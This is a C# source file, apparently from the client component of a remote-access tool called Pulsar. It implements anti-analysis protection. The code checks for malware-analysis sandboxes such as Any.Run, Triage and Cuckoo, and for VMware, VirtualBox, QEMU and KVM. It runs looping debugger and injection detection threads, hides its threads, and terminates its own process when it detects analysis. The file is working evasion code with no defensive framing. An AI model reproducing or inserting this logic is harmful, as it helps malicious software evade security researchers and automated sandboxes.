using Pulsar.Client.Anti.Debugger;
using Pulsar.Client.Anti.Injection;
using Pulsar.Client.Anti.VM;
using Pulsar.Client.Config;
using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Reflection;

//copy pasted / slightly edited from https://github.com/AdvDebug/AntiCrack-DotNet

namespace Pulsar.Client.Anti
{
    public class Manager
    {
        private static bool _debugMode = false;

        public static bool DebugMode
        {
            get => _debugMode;
            set => _debugMode = value;
        }

        private struct DetectionMethod<T>
        {
            public T Method;
            public string Name;
            public string Description;

            public DetectionMethod(T method, string name, string description)
            {
                Method = method;
                Name = name;
                Description = description;
            }
        }

        private static void LogDebug(string message)
        {
            if (DebugMode)
            {
                Console.WriteLine($"[DEBUG] {DateTime.Now:HH:mm:ss.fff} - {message}");
            }
        }

        private static void LogDetection(string detectionType, string methodName, string description)
        {
            Console.WriteLine($"[DETECTION] {DateTime.Now:HH:mm:ss.fff} - {detectionType} detected by '{methodName}': {description}");
        }

        private static void CheckVirtualization()
        {
            LogDebug("Starting virtualization detection checks...");

            var vmChecks = new List<DetectionMethod<Func<bool>>>
            {
                new DetectionMethod<Func<bool>>(AntiVirtualization.AnyRunCheck, "AnyRunCheck", "Any.Run sandbox environment"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.TriageCheck, "TriageCheck", "Triage sandbox environment"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.CheckForQemu, "CheckForQemu", "QEMU virtualization"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.CheckForParallels, "CheckForParallels", "Parallels virtualization"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.IsSandboxiePresent, "IsSandboxiePresent", "Sandboxie sandbox"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.IsComodoSandboxPresent, "IsComodoSandboxPresent", "Comodo sandbox"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.IsCuckooSandboxPresent, "IsCuckooSandboxPresent", "Cuckoo sandbox"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.IsQihoo360SandboxPresent, "IsQihoo360SandboxPresent", "Qihoo 360 sandbox"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.CheckForBlacklistedNames, "CheckForBlacklistedNames", "Blacklisted VM/sandbox names"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.CheckForVMwareAndVirtualBox, "CheckForVMwareAndVirtualBox", "VMware or VirtualBox"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.CheckForKVM, "CheckForKVM", "KVM virtualization"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.BadVMFilesDetection, "BadVMFilesDetection", "VM-specific files"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.BadVMProcessNames, "BadVMProcessNames", "VM-specific processes"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.CheckDevices, "CheckDevices", "VM-specific devices"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.Generic.EmulationTimingCheck, "EmulationTimingCheck", "Emulation timing anomalies"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.Generic.PortConnectionAntiVM, "PortConnectionAntiVM", "VM-specific port connections"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.Generic.AVXInstructions, "AVXInstructions", "AVX instruction emulation"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.Generic.RDRANDInstruction, "RDRANDInstruction", "RDRAND instruction emulation"),
                new DetectionMethod<Func<bool>>(AntiVirtualization.Generic.FlagsManipulationInstructions, "FlagsManipulationInstructions", "Flag manipulation instruction emulation")
            };

            int totalChecks = vmChecks.Count;
            int currentCheck = 0;

            foreach (var vmCheck in vmChecks)
            {
                currentCheck++;
                try
                {
                    LogDebug($"Running VM check {currentCheck}/{totalChecks}: {vmCheck.Name}");

                    if (vmCheck.Method())
                    {
                        LogDetection("VIRTUALIZATION", vmCheck.Name, vmCheck.Description);
                        Console.WriteLine($"[FATAL] Process terminating due to virtualization detection - Exiting...");
                        Process.GetCurrentProcess().Kill();
                    }
                    else
                    {
                        LogDebug($"VM check {vmCheck.Name} passed");
                    }
                }
                catch (Exception ex)
                {
                    LogDebug($"VM check {vmCheck.Name} failed with exception: {ex.Message}");
                }
            }

            LogDebug($"All {totalChecks} virtualization checks completed successfully");
        }

        private static void CheckInjection()
        {
            LogDebug("Starting injection detection checks in background thread...");

            var injectionChecks = new List<DetectionMethod<Func<bool>>>
            {
                new DetectionMethod<Func<bool>>(AntiInjection.CheckInjectedThreads, "CheckInjectedThreads", "Injected threads detection"),
                //new DetectionMethod<Func<bool>>(AntiInjection.ChangeCLRModuleImageMagic, "ChangeCLRModuleImageMagic", "CLR module image magic modification"),
                new DetectionMethod<Func<bool>>(AntiInjection.CheckForSuspiciousBaseAddress, "CheckForSuspiciousBaseAddress", "Suspicious base address (process hollowing)")
            };

            int cycleCount = 0;

            while (true)
            {
                cycleCount++;
                LogDebug($"Starting injection detection cycle #{cycleCount}");

                int totalChecks = injectionChecks.Count;
                int currentCheck = 0;

                foreach (var injectionCheck in injectionChecks)
                {
                    currentCheck++;
                    try
                    {
                        LogDebug($"Running injection check {currentCheck}/{totalChecks}: {injectionCheck.Name}");

                        if (injectionCheck.Method())
                        {
                            LogDetection("INJECTION", injectionCheck.Name, injectionCheck.Description);
                            Console.WriteLine($"[FATAL] Process terminating due to injection detection - Exiting...");
                            Process.GetCurrentProcess().Kill();
                        }
                        else
                        {
                            LogDebug($"Injection check {injectionCheck.Name} passed");
                        }
                    }
                    catch (Exception ex)
                    {
                        LogDebug($"Injection check {injectionCheck.Name} failed with exception: {ex.Message}");
                    }
                }

                LogDebug($"Injection detection cycle #{cycleCount} completed successfully");

                int randomSleep = new Random().Next(1000, 5000);
                LogDebug($"Sleeping for {randomSleep}ms before next injection check cycle");
                Thread.Sleep(randomSleep);
            }
        }

        private static void CheckDebugger()
        {
            LogDebug("Starting debugger detection checks in background thread...");

            var debugDetections = new List<DetectionMethod<Func<bool>>>
            {
                //new DetectionMethod<Func<bool>>(AntiDebug.NtUserGetForegroundWindowAntiDebug, "NtUserGetForegroundWindowAntiDebug", "Debugger window in foreground"),
                new DetectionMethod<Func<bool>>(AntiDebug.DebuggerIsAttached, "DebuggerIsAttached", "Managed debugger attached"),
                new DetectionMethod<Func<bool>>(AntiDebug.IsDebuggerPresentCheck, "IsDebuggerPresentCheck", "Native debugger present"),
                new DetectionMethod<Func<bool>>(AntiDebug.BeingDebuggedCheck, "BeingDebuggedCheck", "PEB BeingDebugged flag set"),
                new DetectionMethod<Func<bool>>(AntiDebug.NtGlobalFlagCheck, "NtGlobalFlagCheck", "NtGlobalFlag indicates debugging"),
                new DetectionMethod<Func<bool>>(AntiDebug.NtSetDebugFilterStateAntiDebug, "NtSetDebugFilterStateAntiDebug", "Debug filter state manipulation"),
                new DetectionMethod<Func<bool>>(AntiDebug.NtQueryInformationProcessCheck_ProcessDebugFlags, "NtQueryInformationProcessCheck_ProcessDebugFlags", "Process debug flags set"),
                new DetectionMethod<Func<bool>>(AntiDebug.NtQueryInformationProcessCheck_ProcessDebugPort, "NtQueryInformationProcessCheck_ProcessDebugPort", "Debug port detected"),
                new DetectionMethod<Func<bool>>(AntiDebug.NtQueryInformationProcessCheck_ProcessDebugObjectHandle, "NtQueryInformationProcessCheck_ProcessDebugObjectHandle", "Debug object handle detected"),
                new DetectionMethod<Func<bool>>(AntiDebug.NtCloseAntiDebug_InvalidHandle, "NtCloseAntiDebug_InvalidHandle", "Invalid handle debugging technique"),
                new DetectionMethod<Func<bool>>(AntiDebug.NtCloseAntiDebug_ProtectedHandle, "NtCloseAntiDebug_ProtectedHandle", "Protected handle debugging technique"),
                new DetectionMethod<Func<bool>>(AntiDebug.HardwareRegistersBreakpointsDetection, "HardwareRegistersBreakpointsDetection", "Hardware breakpoints detected"),
                new DetectionMethod<Func<bool>>(AntiDebug.FindWindowAntiDebug, "FindWindowAntiDebug", "Known debugger windows detected")
            };

            int cycleCount = 0;

            while (true)
            {
                cycleCount++;
                LogDebug($"Starting debugger detection cycle #{cycleCount}");

                try
                {
                    LogDebug("Executing HideThreadsAntiDebug");
                    AntiDebug.HideThreadsAntiDebug();
                }
                catch (Exception ex)
                {
                    LogDebug($"HideThreadsAntiDebug failed with exception: {ex.Message}");
                }

                int totalChecks = debugDetections.Count;
                int currentCheck = 0;

                foreach (var debugCheck in debugDetections)
                {
                    currentCheck++;
                    try
                    {
                        LogDebug($"Running debug check {currentCheck}/{totalChecks}: {debugCheck.Name}");

                        if (debugCheck.Method())
                        {
                            LogDetection("DEBUGGER", debugCheck.Name, debugCheck.Description);
                            Console.WriteLine($"[FATAL] Process terminating due to debugger detection - Exiting...");
                            Process.GetCurrentProcess().Kill();
                        }
                        else
                        {
                            LogDebug($"Debug check {debugCheck.Name} passed");
                        }
                    }
                    catch (Exception ex)
                    {
                        LogDebug($"Debug check {debugCheck.Name} failed with exception: {ex.Message}");
                    }
                }

                LogDebug($"Debugger detection cycle #{cycleCount} completed successfully");

                int randomSleep = new Random().Next(1000, 5000);
                LogDebug($"Sleeping for {randomSleep}ms before next debugger check cycle");
                Thread.Sleep(randomSleep);
            }
        }

        public static void StartAnti()
        {
            LogDebug($"[ANTI] Starting Anti-Analysis protection systems at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            LogDebug($"Debug mode is {(DebugMode ? "ENABLED" : "DISABLED")}");

            LogSystemInfo();

            if (Settings.ANTIVM)
            {
                LogDebug("[ANTI] Anti-VM protection enabled - Checking for virtualization environments...");
                LogDebug("ANTIVM setting is enabled, starting virtualization checks");
                try
                {
                    CheckVirtualization();
                    LogDebug("[ANTI] No virtualization detected - Anti-VM checks passed");
                }
                catch (Exception ex)
                {
                    LogDebug($"CheckVirtualization failed with exception: {ex.Message}");
                    LogDebug("[ERROR] Anti-VM checks encountered an error but continuing...");
                }
            }
            else
            {
                LogDebug("ANTIVM setting is disabled, skipping virtualization checks");
            }

            if (Settings.ANTIDEBUG)
            {
                LogDebug("[ANTI] Anti-Debug protection enabled - Starting background monitoring threads...");
                LogDebug("ANTIDEBUG setting is enabled, starting background detection threads");

                try
                {
                    LogDebug("Starting injection detection thread");
                    Task.Factory.StartNew(() => CheckInjection(), TaskCreationOptions.LongRunning);
                    LogDebug("[ANTI] Injection detection thread started");
                }
                catch (Exception ex)
                {
                    LogDebug($"Failed to start injection detection thread: {ex.Message}");
                    LogDebug("[ERROR] Failed to start injection detection thread");
                }

                try
                {
                    LogDebug("Starting debugger detection thread");
                    Task.Factory.StartNew(() => CheckDebugger(), TaskCreationOptions.LongRunning);
                    LogDebug("[ANTI] Debugger detection thread started");
                }
                catch (Exception ex)
                {
                    LogDebug($"Failed to start debugger detection thread: {ex.Message}");
                    LogDebug("[ERROR] Failed to start debugger detection thread");
                }

                LogDebug("[ANTI] Anti-Debug background monitoring is now active");
            }
            else
            {
                LogDebug("ANTIDEBUG setting is disabled, skipping debug detection");
            }

            LogDebug("[ANTI] Anti-Analysis protection initialization complete");
            LogDebug($"[ANTI] Protection Status: {GetProtectionStatus()}");
            LogDebug("StartAnti() completed successfully");
        }

        /// <summary>
        /// Toggle debug mode on/off during runtime
        /// </summary>
        /// <param name="enabled">True to enable debug logging, false to disable</param>
        public static void SetDebugMode(bool enabled)
        {
            DebugMode = enabled;
            LogDebug($"[ANTI] Debug mode {(enabled ? "ENABLED" : "DISABLED")}");
        }

        /// <summary>
        /// Get status of anti-protection systems
        /// </summary>
        /// <returns>Status string</returns>
        public static string GetProtectionStatus()
        {
            return $"Anti-VM: {(Settings.ANTIVM ? "ENABLED" : "DISABLED")}, " +
                   $"Anti-Debug: {(Settings.ANTIDEBUG ? "ENABLED" : "DISABLED")}, " +
                   $"Debug Mode: {(DebugMode ? "ENABLED" : "DISABLED")}";
        }

        /// <summary>
        /// Log system information for debugging purposes
        /// </summary>
        public static void LogSystemInfo()
        {
            if (!DebugMode) return;

            try
            {
                LogDebug("=== SYSTEM INFORMATION ===");
                LogDebug($"OS Version: {Environment.OSVersion}");
                LogDebug($"CLR Version: {Environment.Version}");
                LogDebug($"Process Name: {Process.GetCurrentProcess().ProcessName}");
                LogDebug($"Process ID: {Process.GetCurrentProcess().Id}");
                LogDebug($"Is 64-bit Process: {Environment.Is64BitProcess}");
                LogDebug($"Is 64-bit OS: {Environment.Is64BitOperatingSystem}");
                LogDebug($"Machine Name: {Environment.MachineName}");
                LogDebug($"User Name: {Environment.UserName}");
                LogDebug($"Working Set: {Environment.WorkingSet} bytes");
                LogDebug("=== END SYSTEM INFORMATION ===");
            }
            catch (Exception ex)
            {
                LogDebug($"Failed to log system information: {ex.Message}");
            }
        }
    }
}